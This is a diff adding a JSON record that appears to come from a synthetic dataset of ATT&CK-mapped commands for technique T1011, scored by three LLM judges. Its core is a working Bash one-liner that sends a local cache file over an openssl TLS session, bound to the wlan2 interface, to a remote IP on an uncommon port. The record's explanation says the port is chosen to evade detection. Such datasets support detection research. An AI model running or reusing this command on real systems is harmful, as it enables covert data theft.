@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && openssl s_client -quiet -connect 10.55.88.15:49573 -bind \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\":0 < /home/user/.cache/map.dat",
+  "explanation": "Sends data over a TLS session explicitly bound to wlan2, using a non-standard port to minimize detection; this leverages a distinct wireless medium consistent with T1011.",
+  "rationale_steps": [
+    "Validate wlan2 as the alternate medium using iwconfig.",
+    "Bind the TLS client to wlan2’s local IP to isolate the path from the primary channel.",
+    "Transmit the file over a high, uncommon port without altering system routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-a13a4d10",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quotes, valid redirections, proper command substitution, and correctly concatenated -bind argument.",
+        "semantic_score": 4,
+        "semantic_justification": "It sends the file over a TLS session bound to wlan2 on a non-standard port as claimed, but depends on -bind support and a single IPv4 on wlan2 with a valid route.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T05:02:37.281818Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command chaining (&&), balanced quotes, valid redirection (>/dev/null 2>&1), and correct use of command substitution ($(...)).",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns well with T1011 by automating exfiltration of data from map.dat over TLS to a specific IP/port, though it lacks scheduling/batching elements that would make it fully representative of automated exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:02:40.642692Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct command substitution syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by binding an `openssl` TLS session to the specified wireless interface (`wlan2`) to exfiltrate data from a file, directly aligning with T1011's concept of transferring collected data over specific channels.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:02:51.314988Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
